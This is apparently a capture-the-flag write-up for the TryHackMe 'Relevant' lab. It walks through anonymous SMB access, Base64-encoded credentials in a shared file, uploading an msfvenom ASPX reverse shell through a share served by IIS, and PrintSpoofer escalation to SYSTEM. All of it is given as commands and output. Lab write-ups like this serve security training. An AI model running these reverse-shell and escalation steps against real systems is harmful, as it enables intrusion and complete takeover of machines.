# Relevant

Penetration Testing Challenge

Room: https://tryhackme.com/room/relevant

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/anonymous.md

---

## Enumeration

Run a full TCP scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt <TARGET-IP>
```

Interesting results:

```text
80/tcp     open  http          Microsoft IIS httpd 10.0
135/tcp    open  msrpc
139/tcp    open  netbios-ssn
445/tcp    open  microsoft-ds
3389/tcp   open  ms-wbt-server
49663/tcp  open  http          Microsoft IIS httpd 10.0
49667/tcp  open  msrpc
49668/tcp  open  msrpc
```

Nmap also showed the host was Windows Server 2016 and SMB guest access was possible.

---

## SMB Enumeration

List SMB shares anonymously:

```bash
smbclient -L //<TARGET-IP>/ -N
```

Shares found:

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

Connect to the interesting share:

```bash
smbclient //<TARGET-IP>/nt4wrksv -N
```

List files:

```text
ls
```

A file named `passwords.txt` was present.

Download it:

```text
get passwords.txt
```

Exit SMB:

```text
exit
```

View the file:

```bash
cat passwords.txt
```

The file contained Base64-encoded credentials:

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
```

Decode it:

```bash
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
```

This reveals credentials for `Bob`.

Obfuscated credential:

```text
Bob : !P@$$W...!123
```

---

## Validate Credentials

Confirm the credentials work:

```bash
nxc smb <TARGET-IP> -u Bob -p '<PASSWORD>'
```

Expected result:

```text
[+] Relevant\Bob:<PASSWORD>
```

---

## Check if the SMB Share Maps to IIS

Create a test file:

```bash
echo test > test.txt
```

Upload it to the share:

```bash
smbclient //<TARGET-IP>/nt4wrksv -N
```

Inside SMB:

```text
put test.txt
exit
```

Now check the IIS high port:

```bash
curl -i http://<TARGET-IP>:49663/nt4wrksv/test.txt
```

If successful, the response shows:

```text
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

test
```

This confirms the share is writable and web-accessible:

```text
SMB write → IIS web path
```

---

## Generate ASPX Reverse Shell

Generate an ASPX payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKBOX-IP> LPORT=4444 -f aspx -o shell.aspx
```

Start a listener:

```bash
rlwrap nc -lvnp 4444
```

Upload the shell to the SMB share:

```bash
smbclient //<TARGET-IP>/nt4wrksv -N
```

Inside SMB:

```text
put shell.aspx
exit
```

Trigger the shell through IIS:

```bash
curl http://<TARGET-IP>:49663/nt4wrksv/shell.aspx
```

A reverse shell should connect back:

```text
Microsoft Windows [Version 10.0.14393]

c:\windows\system32\inetsrv>
```

---

## User Flag

Check the current user:

```cmd
whoami
```

List users:

```cmd
dir C:\Users
```

Check Bob’s Desktop:

```cmd
dir C:\Users\Bob\Desktop
```

Read the user flag:

```cmd
type C:\Users\Bob\Desktop\user.txt
```

Obfuscated flag:

```text
THM{fdk4ka34...789ktf45}
```

---

## Privilege Enumeration

Check privileges:

```cmd
whoami /priv
```

Important privilege:

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

This suggests a Potato-style privilege escalation should work.

Check groups as well:

```cmd
whoami /groups
```

---

## Privilege Escalation with PrintSpoofer

Download PrintSpoofer on the AttackBox:

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O ps.exe
```

Upload it through the SMB share:

```bash
smbclient //<TARGET-IP>/nt4wrksv -N
```

Inside SMB:

```text
put ps.exe
exit
```

On the Windows shell, move to the IIS mapped directory:

```cmd
cd C:\inetpub\wwwroot\nt4wrksv
dir
```

Run PrintSpoofer:

```cmd
ps.exe -i -c cmd
```

Expected output:

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Check the new shell:

```cmd
whoami
```

Expected result:

```text
nt authority\system
```

---

## Root Flag

Move to the Administrator Desktop:

```cmd
cd C:\Users\Administrator\Desktop
```

Read the root flag:

```cmd
type root.txt
```

Obfuscated flag:

```text
THM{1fk5kf469...gl345pv}
```

---

## Cleanup

Remove uploaded files from the SMB share:

```bash
smbclient //<TARGET-IP>/nt4wrksv -N
```

Inside SMB:

```text
del test.txt
del shell.aspx
del ps.exe
exit
```

---

## Final Attack Path

```text
Nmap found IIS, SMB, RDP, and high-port IIS
→ SMB allowed anonymous access
→ nt4wrksv share contained passwords.txt
→ passwords.txt contained Base64 credentials
→ credentials decoded to Bob
→ Bob credentials validated
→ nt4wrksv was writable
→ nt4wrksv was exposed through IIS on port 49663
→ uploaded ASPX reverse shell
→ triggered shell through browser/curl
→ read user.txt from Bob Desktop
→ found SeImpersonatePrivilege enabled
→ uploaded PrintSpoofer
→ used PrintSpoofer to spawn SYSTEM shell
→ read root.txt from Administrator Desktop
```

## Key Lessons

The main issue was a writable SMB share being exposed through IIS. This allowed file upload to become remote code execution.

The privilege escalation worked because the IIS service context had `SeImpersonatePrivilege`, which allowed PrintSpoofer to spawn a SYSTEM shell.
